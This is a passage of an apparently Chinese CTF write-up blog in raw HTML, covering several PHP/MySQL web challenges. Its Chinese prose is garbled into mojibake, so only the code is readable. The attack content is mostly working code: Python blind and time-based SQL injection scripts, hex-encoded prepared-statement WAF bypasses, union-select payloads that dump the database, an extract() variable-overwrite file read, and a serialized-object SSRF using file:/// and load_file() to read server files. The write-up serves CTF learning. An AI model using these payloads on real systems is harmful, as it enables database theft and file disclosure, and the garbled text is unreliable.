%00æˆªæ–­åé¢çš„å†…å®¹ã€‚ä½†æ˜¯ä¸èƒ½åœ¨è¾“å…¥æ¡†ç›´æ¥æäº¤ï¼Œä¼šè¢«url encode å˜ä¸º%2500è¢«é»‘åå•æ‹¦æˆªã€‚</p><p>æŸ¥è¯¢è¯­å¥å˜ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;\&#39; and passwd&#x3D;&#39;||&#x2F;**&#x2F;passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^a&quot;;</span><br></pre></td></tr></table></figure><p>å¦‚æœregexä¸ºçœŸçš„è¯ï¼Œä¼šè¿”å›404ï¼Œå¦åˆ™è·³è½¬è‡³ç™»å½•ç•Œé¢ã€‚</p><p>ç›²æ³¨è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://aabb7aa1-f68f-44c7-9e75-514410c6d6f2.node3.buuoj.cn/index.php&#x27;&#x27;&#x27;</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">strs = string.ascii_lowercase + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> strs:</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;</span>.format(passwd+m, parse.unquote(<span class="string">&#x27;%00&#x27;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">404</span>:</span><br><span class="line">            passwd += m</span><br><span class="line">            print(passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(passwd)</span><br></pre></td></tr></table></figure><h2 id="SWPUCTF2019-web1">SWPUCTF2019 web1</h2><h3 id="è€ƒç‚¹-v11">è€ƒç‚¹</h3><ul><li>åå…­è¿›åˆ¶+MySQLé¢„ç¼–è¯‘ç»•è¿‡</li><li>PHPä»£ç å®¡è®¡</li></ul><h3 id="è§£é¢˜-v11">è§£é¢˜</h3><p>é¢˜ç›®åªæœ‰ä¸€ä¸ªç™»å½•æ¡†ï¼Œæ³¨å†ŒåŠŸèƒ½æœªå¼€æ”¾ï¼Œéšæ„å¡«å†™å†…å®¹ï¼Œç‚¹å‡»ç™»å½•ï¼ŒæŠ“åŒ…</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816090843.png" alt=""></p><p>åœ¨usernameå­—æ®µæ·»åŠ ä¸€ä¸ªå•å¼•å·PHPä¼šæŠ¥é”™</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816090948.png" alt=""></p><p>è€Œé—­åˆå¼•å·åä¼šæ­£å¸¸æ˜¾ç¤ºã€‚å› æ­¤å¯å¤§è‡´ç¡®å®šæ³¨å…¥å­˜åœ¨ï¼Œéšåå¼€å§‹æ„é€ payloadã€‚ç”±äºé¢˜ç›®å¯¹usernameè¿›è¡Œäº†ä¸¥æ ¼çš„æ£€æµ‹ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨å•è¯­å¥è¿›è¡Œæ³¨å…¥ï¼Œä½†æ˜¯æ³¨å…¥ç‚¹åˆå­˜åœ¨ï¼Œäºæ˜¯å¯ä»¥å°è¯•è¿›è¡Œå †å æ³¨å…¥ã€‚</p><p>ä¸è¿‡è²Œä¼¼è¿‡æ»¤äº†ç»å¤§å¤šæ•°çš„å…³é”®å­—ï¼Œé‡‡ç”¨16è¿›åˆ¶+MySQLé¢„å¤„ç†ç»•è¿‡ã€‚åŸç†å¦‚ä¸‹ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816091925.png" alt=""></p><p>ç¼–å†™æ—¶é—´ç›²æ³¨è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;&#x27;http://71c8375e-74ff-45aa-a2ee-8670864f6b0b.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span></span><br><span class="line">    payloads = <span class="string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">        <span class="comment"># payload = &quot;select if(ascii(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="comment"># payload = &quot;select if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="comment"># payload = &quot;select if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">128</span>):</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            datas = &#123;<span class="string">&#x27;username&#x27;</span>: payloads.format(str_to_hex(payload.format(i, j))), <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;test213&#x27;</span>&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url=url, data=data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">3</span>:</span><br><span class="line">                flag = flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([hex(ord(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>æœ€åè·‘å‡ºäº†ä¸€ä¸ªæºä»£ç ï¼Œè¿›è¡Œå®¡è®¡ã€‚</p><p>æ—¢ç„¶æ˜¯MVCæ¶æ„ï¼Œå…ˆå¼„æ¸…æ¥šè·¯ç”±</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;r&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$r = explode(<span class="string">&#x27;/&#x27;</span>, $_REQUEST[<span class="string">&#x27;r&#x27;</span>]);</span><br><span class="line"><span class="keyword">list</span>($controller,$action) = $r;</span><br><span class="line">$controller = <span class="string">&quot;<span class="subst">&#123;$controller&#125;</span>Controller&quot;</span>;</span><br><span class="line">$action = <span class="string">&quot;action<span class="subst">&#123;$action&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(class_exists($controller))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(method_exists($controller,$action))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$action = <span class="string">&quot;actionIndex&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$controller = <span class="string">&quot;LoginController&quot;</span>;</span><br><span class="line">        $action = <span class="string">&quot;actionIndex&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    $data = call_user_func(<span class="keyword">array</span>( (<span class="keyword">new</span> $controller), $action));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;Location:index.php?r=Login/Index&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»rå‚æ•°ä¸­è·å–è¦è®¿é—®çš„Controllerä»¥åŠAction,ç„¶åä»¥/åˆ†éš”å¼€åæ‹¼æ¥æˆå®Œæ•´çš„æ§åˆ¶å™¨åã€‚ä»¥Login/Indexä¸ºä¾‹ï¼Œå°±æ˜¯å°†Login/Indexåˆ†éš”å¼€åˆ†åˆ«æ‹¼æ¥æˆLoginControllerä»¥åŠactionIndex,ç„¶åè°ƒç”¨LoginControllerè¿™ä¸ªç±»ä¸­çš„actionIndexæ–¹æ³•ã€‚æ¯ä¸ªactioné‡Œé¢ä¼šè°ƒç”¨å¯¹åº”çš„loadView()æ–¹æ³•è¿›è¡Œæ¨¡ç‰ˆæ¸²æŸ“ï¼Œç„¶åå°†é¡µé¢è¿”å›ç»™å®¢æˆ·ç«¯ã€‚è‹¥è®¿é—®çš„Controllerä¸å­˜åœ¨åˆ™é»˜è®¤è§£æLogin/Indexã€‚</p><p>ä¸‹é¢çœ‹å…³é”®ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadView</span>(<span class="params">$viewName =<span class="string">&#x27;&#x27;</span>, $viewData = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;viewPath = BASE_PATH . <span class="string">&quot;/View/<span class="subst">&#123;$viewName&#125;</span>.php&quot;</span>;</span><br><span class="line">   <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;viewPath))</span><br><span class="line">   &#123;</span><br><span class="line">      extract($viewData);</span><br><span class="line">      <span class="keyword">include</span> <span class="keyword">$this</span>-&gt;viewPath;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾å¯ä»¥é€šè¿‡extractæ¥è¦†ç›–å˜é‡ï¼Œä¸è¿‡ç°åœ¨è¿˜ä¸çŸ¥é“éœ€è¦è¦†ç›–ä»€ä¹ˆå˜é‡ï¼Œå¯»æ‰¾å‡ ä¸ªè°ƒç”¨loadViewçš„æ–¹æ³•ï¼Œå‘ç°ä¸€ä¸ªå¯¹<code>$viewData</code>å®Œå…¨å¯æ§çš„åœ°æ–¹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $listData = $_REQUEST;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadView(<span class="string">&#x27;userIndex&#x27;</span>,$listData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$listData</code>æ˜¯ä»REQUESTæå–å‡ºæ¥çš„ï¼Œå®Œå…¨å¯æ§ã€‚è€Œå…¶å¯¹åº”çš„/View/userIndex.phpä¸­å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶è¯»å–ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span>(!<span class="keyword">isset</span>($img_file)) &#123;</span><br><span class="line">     $img_file = <span class="string">&#x27;/../favicon.ico&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">$img_dir = dirname(<span class="keyword">__FILE__</span>) . $img_file;</span><br><span class="line">$img_base64 = imgToBase64($img_dir);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> . $img_base64 . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œ<code>$img_file</code>å¯é€šè¿‡<code>extract($viewData)</code>å˜é‡è¦†ç›–æ¼æ´å®Œå…¨æ§åˆ¶ï¼Œè€Œ<code>$viewData</code>æ˜¯å—ç”¨æˆ·æ§åˆ¶çš„å®Œå…¨æ§åˆ¶çš„ã€‚æ‰€ä»¥è¿™é‡Œå°±å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚</p><p>æ‰€ä»¥è®¿é—®<code>?r=User/Index&amp;img_file=/../flag.php</code>å¯ç›´æ¥è·å–flag.phpç»base64åçš„å†…å®¹ã€‚</p><h2 id="å¼ºç½‘æ¯2019-Fakebook">å¼ºç½‘æ¯2019 Fakebook</h2><h3 id="è€ƒç‚¹-v12">è€ƒç‚¹</h3><ul><li>æºç æ³„éœ²</li><li>SQLæ³¨å…¥</li><li>PHPååºåˆ—åŒ–</li><li>SSRF</li></ul><h3 id="é¢˜è§£">é¢˜è§£</h3><p>æœ‰robots.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;user.php.bak</span><br></pre></td></tr></table></figure><p>è®¿é—®ä¸€ä¸‹æ‹¿åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name, $age, $blog</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€çœ¼çœ‹ä¸Šå»å°±å¾ˆåƒæ˜¯SSRFæ¼æ´åˆ©ç”¨ï¼Œä½†æ˜¯å§‹ç»ˆç»•ä¸è¿‡<code>isValidBlog</code>å‡½æ•°ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼</p><p>èµ°ä¸€ä¸‹ç½‘ç«™çš„æµç¨‹</p><p>æ³¨å†Œäº†è´¦å·</p><p>è®¿é—®ä¸ªäººç•Œé¢æ—¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:53095&#x2F;view.php?no&#x3D;1</span><br></pre></td></tr></table></figure><p>è¾“å…¥no=9</p><p>æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œæ³„éœ²äº†ç›®å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Notice: Trying to get property of non-object in &#x2F;var&#x2F;www&#x2F;html&#x2F;view.php on line 53</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰sqlæ³¨å…¥ï¼Œæ‰‹å·¥æ³¨å¤±è´¥äº†ï¼Œæœ‰wafã€‚</p><p>çœ‹äº†ä¸€ä¸‹å¸ˆå‚…ä»¬çš„wp,å‘ç°æ˜¯wafæŠŠunion selectç»™è¿‡æ»¤äº†ï¼Œç”¨/**/å†…è”æ³¨é‡Šæ¥ç»•è¿‡ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620150734.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#çˆ†è¡¨</span><br><span class="line">no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;database() </span><br><span class="line">#çˆ†åˆ—</span><br><span class="line">no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema&#x3D;database()</span><br><span class="line">#çˆ†åˆ—dataçš„å†…å®¹</span><br><span class="line">no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(data),3,4 from users</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620151058.png" alt=""></p><p>dataé‡Œçš„å†…å®¹å°±æ˜¯æˆ‘ä»¬ä¹‹å‰æ³¨å†Œç”¨æˆ·çš„åºåˆ—åŒ–æ•°æ®ï¼ŒæŠ¥é”™ä¿¡æ¯æš—ç¤ºæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize(): Error at offset 0 of 1 bytes in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php&lt;&#x2F;b&gt; on line 31</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæäº¤äº†ä¸€ä¸ªnoçš„å‚æ•°ï¼Œè¿”å›äº†ç”¨æˆ·ä¿¡æ¯è¿™ä¸ªé¡µé¢ï¼Œæ‰€ä»¥ä¸éš¾çŒœåˆ°æœåŠ¡å™¨ç«¯æ˜¯é€šè¿‡åˆ†ænoå‚æ•°ï¼Œå†ä»æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œç„¶åè¿”å›æˆ‘ä»¬çš„ä¿¡æ¯ï¼Œä¹‹å‰sqlæ³¨å…¥æ—¶å¾—åˆ°äº†æœåŠ¡å™¨å†æŸ¥è¯¢æ—¶æ˜¯æŸ¥è¯¢äº†4ä¸ªå­—æ®µï¼Œè€Œæˆ‘ä»¬å¾—åˆ°çš„å¯ç”¨çš„å­—æ®µæœ‰[no,username,passwd,data]å››ä¸ªå­—æ®µã€‚</p><p>æ¯‹åº¸ç½®ç–‘çš„æ˜¯æˆ‘ä»¬çš„æ³¨å†Œä¿¡æ¯æ˜¯å†™å…¥äº†æ•°æ®åº“çš„ï¼Œè€Œno,username,passwdä¸‰ä¸ªå­—æ®µå‡æ²¡æœ‰æˆ‘ä»¬æ³¨å†Œæ—¶å€™å¡«å†™çš„blogåœ°å€ï¼Œåªæœ‰dataå­—æ®µä¸­æœ‰ä¸€ä¸ªåºåˆ—åŒ–åçš„blogå±æ€§çš„å€¼ã€‚é‚£ä¹ˆè¿”å›çš„é¡µé¢ä¸­çš„bolgåœ°å€æ˜¯æ€ä¹ˆæŸ¥è¯¢çš„? æˆ–è€…è¯´æ€ä¹ˆå¾—åˆ°çš„ï¼Ÿå°±æ˜¯é€šè¿‡æŸ¥è¯¢dataå­—æ®µ,å¾—åˆ°å…¶ä¸­çš„åºåˆ—åŒ–ä¿¡æ¯æ¥æ¸²æŸ“æ•´ä¸ªé¡µé¢ï¼Œä»è€Œæ°å¥½å¾—åˆ°é¡µé¢ä¸­çš„username,age,blogå€¼ã€‚</p><p>çŒœæƒ³åˆ°è¿™ä¸ªé€»è¾‘ä¹‹å,æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹æŸ¥è¯¢çš„åºåˆ—åŒ–å¯¹è±¡çš„å€¼æ¥æ„é€ ssrfè¯·æ±‚,ä»è€Œè¯»å–åˆ°flagæ–‡ä»¶</p><p>åˆ©ç”¨å‰é¢æ³„éœ²çš„æºç æ„é€ ä¸€ä¸ªæ¶æ„å¯¹è±¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">233</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = <span class="keyword">new</span> UserInfo();</span><br><span class="line"><span class="keyword">echo</span> serialize($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨getBlogContentsè°ƒç”¨çš„curlè¿›è¡ŒSSRFæ”»å‡»ï¼Œå››ä¸ªå‚æ•°éƒ½è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ç¬¬4ä¸ªç”¨æ¥è¯»ç”¨æˆ·æ•°æ®çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure><p>åœ¨iframeä¸­å¾—åˆ°flagã€‚</p><h3 id="éé¢„æœŸè§£">éé¢„æœŸè§£</h3><p>æºç æ²¡æœ‰è¿‡æ»¤load_fileå‡½æ•°ï¼Œå¯ä»¥ç›´æ¥åŒ…å«ä¸€ä¸ªæ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;0+unIon&#x2F;**&#x2F;select+1,load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;),1,1</span><br></pre></td></tr></table></figure><blockquote><p>load_fileä½¿ç”¨æ¡ä»¶ï¼š</p><p>1.ç”¨æˆ·æœ‰å¾ˆé«˜çš„æƒé™</p><p>2.çŸ¥é“æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</p></blockquote><h2 id="BJDCTF-2nd-ç®€å•æ³¨å…¥">BJDCTF 2nd ç®€å•æ³¨å…¥</h2><h3 id="è€ƒç‚¹-v13">è€ƒç‚¹</h3><ul><li>MySQLç›²æ³¨</li><li>Pythonè„šæœ¬ç¼–å†™</li></ul><h3 